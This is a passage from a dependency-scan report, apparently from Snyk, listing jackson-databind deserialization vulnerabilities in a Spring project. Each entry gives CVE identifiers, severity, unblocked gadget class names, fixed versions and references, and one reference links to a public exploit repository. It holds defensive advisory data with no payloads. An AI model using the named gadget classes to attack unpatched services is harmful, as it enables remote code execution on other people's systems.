          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "Release Notes",
          "url": "https://github.com/FasterXML/jackson-databind/blob/a6667bcd1f0114f5b004d5203f4139b1e6104a1c/release-notes/VERSION-2.x"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9.1)",
          "[2.8.0,2.8.11.4)",
          "[,2.7.9.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-07-29T14:55:33.030000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `SubTypeValidator.java` mishandles default typing when `ehcache` is used, leading to remote code execution.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.9.2, 2.8.11.4, 2.7.9.6 or higher.\n## References\n- [GitHub Comparison](https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2387)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2389)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2395)\n- [Snyk Blog](https://snyk.io/blog/jackson-deserialization-vulnerability/)\n",
      "disclosureTime": "2019-07-29T12:40:42Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.9.2",
        "2.8.11.4",
        "2.7.9.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.2)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.9.0,2.9.9.2)",
            "[2.8.0,2.8.11.4)",
            "[,2.7.9.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-455617",
      "identifiers": {
        "CVE": [
          "CVE-2019-14379",
          "CVE-2019-14439"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-gwp4-hfv6-p7hw",
          "GHSA-6fpp-rgj9-8rwc"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:55:20.568391Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-07-29T12:40:42Z",
      "references": [
        {
          "title": "GitHub Comparison",
          "url": "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2387"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2389"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2395"
        },
        {
          "title": "Snyk Blog",
          "url": "https://snyk.io/blog/jackson-deserialization-vulnerability/"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.9.2)",
          "[2.8.0,2.8.11.4)",
          "[,2.7.9.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-09-16T13:03:06.837179Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered as `com.zaxxer.hikari.HikariDataSource` was not blocked.\r\n**Note:** This is a different vulnerability than CVE-2019-14540.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/73c1c2cc76e6cdd7f3a5615cbe3207fe96e4d3db)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2449)\n",
      "disclosureTime": "2019-09-15T23:30:24Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.pr2)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.pr2)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467014",
      "identifiers": {
        "CVE": [
          "CVE-2019-16335"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-85cw-hj65-qqv9"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:56:39.085420Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-09-16T23:30:24Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/73c1c2cc76e6cdd7f3a5615cbe3207fe96e4d3db"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2449"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
      "alternativeIds": [],
      "creationTime": "2019-09-16T13:03:10.401907Z",
      "credit": [
        "iSafeBlue"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered as `com.zaxxer.hikari.HikariConfig` was not blocked.\r\n**Note:** This is a different vulnerability than CVE-2019-16335.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [Exploit](https://github.com/LeadroyaL/cve-2019-14540-exploit)\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2410)\n",
      "disclosureTime": "2019-09-15T23:27:25Z",
      "exploit": "Functional",
      "fixedIn": [
        "2.9.10",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr2)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr2)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467015",
      "identifiers": {
        "CVE": [
          "CVE-2019-14540"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-h822-r4r5-v8jg"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:56:50.528629Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-09-16T23:27:25Z",
      "references": [
        {
          "title": "Exploit",
          "url": "https://github.com/LeadroyaL/cve-2019-14540-exploit"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2410"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2019-09-16T14:43:42.115110Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.cxf.jaxrs.provider.XSLTJaxbProvider`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2420)\n",
      "disclosureTime": "2019-09-16T14:37:38Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.9.10",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.10.0.pr1,2.10.0.pr2)",
            "[,2.9.10)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.10.0.pr1,2.10.0.pr2)",
            "[,2.9.10)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-467016",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-16T07:12:43.572376Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-09-16T14:37:37Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2420"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-02T08:02:18.178548Z",
      "credit": [
        "bsmali4"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered within `org.apache.commons.dbcp.datasources.SharedPoolDataSource` was not blocked. An attacker could leverage this gadget type  to perform Remote Code Execution attacks through deserialization.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.1, 2.8.11.5, 2.6.7.3 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2478)\n",
      "disclosureTime": "2019-10-01T17:43:33Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.9.10.1",
        "2.8.11.5",
        "2.6.7.3"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-469674",
      "identifiers": {
        "CVE": [
          "CVE-2019-16942"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-mx7p-6679-8g3q"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-25T15:59:50.138598Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-10-02T17:43:33Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2478"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.9.0,2.9.10.1)",
          "[2.7.0,2.8.11.5)",
          "[,2.6.7.3)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2019-10-02T08:03:39.391997Z",
      "credit": [
        "bsmali4"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A Polymorphic Typing issue was discovered as `com.p6spy.engine.spy.P6DataSource` was not blocked. An attacker could leverage this gadget type  to perform Remote Code Execution attacks through deserialization.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best 